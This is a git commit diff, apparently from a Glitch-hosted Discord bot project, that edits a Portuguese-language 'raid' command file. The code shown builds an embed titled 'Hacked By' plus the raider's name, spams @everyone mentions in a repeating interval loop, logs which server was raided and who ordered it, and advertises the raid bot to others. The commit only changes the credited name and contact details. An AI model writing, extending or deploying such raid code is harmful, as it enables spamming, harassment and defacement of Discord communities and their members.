8b0e0c25ea17b4270fde376ccf5cd86268826505
Glitch (equable-gymnast) <none>
2020-01-05 00:05:38 +0000

    🔖🍕 Checkpoint ./commands/Nome.json:6833819/57 ./commands/raid1.js:6833819/123

--- commands/raid1.js
+++ commands/raid1.js
@@ -3,10 +3,10 @@ const nome = require("./Nome.json").nome;
 exports.run = async (client, message, args) => {
     console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + ` | Id De ${message.author.username}: ${message.author.id}`)
     //message.guild.setName(`Hackeado Por ${arg}`)
-    let Title = "Hacked By Gustavo33"
+    let Title = "Hacked By ! 𝓗𝓨𝓟'×𝓡𝓮𝓵𝓲𝓴𝓲𝓪"
     let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
     let field = "Quer Ter Esse Bot De Raid?"
-    let fieldd = "Veja Esse Video: https://youtu.be/3q5WC9EFseI" // descricão do field
+    let fieldd = "Fale com: ! 𝓗𝓨𝓟'×𝓡𝓮𝓵𝓲𝓴𝓲𝓪#9999" // descricão do field
     function raid(){
       setInterval(() => {
    const embed = new discord.RichEmbed()
